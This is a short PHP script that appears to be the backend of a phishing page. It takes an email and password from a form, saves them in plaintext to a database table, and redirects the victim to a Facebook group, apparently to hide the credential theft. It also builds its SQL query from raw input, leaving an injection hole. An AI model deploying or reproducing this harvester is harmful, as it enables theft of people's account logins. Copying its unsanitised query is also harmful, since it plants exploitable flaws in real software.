<?php
include('connection.php');
if(isset($_POST['submit'])){
	$email = $_POST['email'];
	$password = $_POST['password'];
	
	$sql = "INSERT INTO `data`(`username`, `password`) VALUES ('$email','$password')";
	if(mysqli_query($con,$sql)){
		header('location:https://www.facebook.com/groups/1559070281037387/');
	}
}
?>